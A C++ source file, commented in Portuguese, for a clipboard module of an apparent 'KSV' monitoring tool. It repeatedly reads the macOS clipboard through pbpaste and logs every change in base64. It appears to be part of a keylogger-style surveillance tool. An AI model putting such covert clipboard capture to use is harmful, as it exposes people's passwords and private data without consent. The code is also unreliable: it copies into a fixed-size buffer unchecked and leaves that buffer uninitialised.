#include <cstdlib>
#include <stdio.h>
#include <iostream>
#include <thread>
#include "KSVClipboard.h"
#include "KSVConfig.h"
#include "KSVLogger.h"
#include "base64.h"

void Clipboard::operator()() {
    Logger *logger = Logger::instance();
//    logger->writeln("[[C] CLIPBOARD INITIALIZED]");

    FILE *pop;
    char buffer[KSV_CLIPBOARD_MAX_BYTES];
    char cachedBuffer[KSV_CLIPBOARD_MAX_BYTES];

    int tryCount = 0;

    while (true) {
        pop = popen("pbpaste", "r");

        if (pop == 0) {
            tryCount++;
            this->wait();
            continue;
        }

        // Verifica se o limite máximo de falhas ao capturar o OUT do popen for atingido.
        if (tryCount >= KSV_RETRY_MAX_COUNT) {
            logger->e("KSVClipboard interrompido. Limite máximo de tentativas atingido!");
            break;
        }

        std::string ctData;

        // Lê o clipboard até o buff limite
        while (fgets(buffer, KSV_CLIPBOARD_MAX_BYTES, pop)) {
            if (strcmp("", buffer) == 0) {
                continue;
            }

            ctData += buffer;
        }

        if (!ctData.empty()) {
            // Codifica em base 64 a string do clipboard, para garantir integridade nos dados.
            ctData = base64_encode(reinterpret_cast<const unsigned char*>(ctData.c_str()), (unsigned int) ctData.length());

            // Transforma a String C++ para String C, para comparar
            const char *ctData_cStr = ctData.c_str();

            // Compara o buffer atual, com o buffer em cache (da ultima gravação do clipboard), para ver se existem alterações que devem ser gravadas.
            if (strcmp(ctData_cStr, cachedBuffer) != 0) {
                logger->write("[t:");
                logger->write("[");
                logger->write(ctData);

                if(Logger::instance()->blockNewLineOnGroups) {
                    logger->write("]");
                }else{
                    logger->writeln("]");
                }

                // Armazena o buffer gravado, para o cache para comparar nas iterações seguintes.
                strcpy(cachedBuffer, ctData_cStr);
            }
        }

        // Libera
        pclose(pop);

        this->wait();
    }

}

void Clipboard::wait() {
    std::this_thread::sleep_for(std::chrono::milliseconds(KSV_CLIPBOARD_INTERVAL));
}



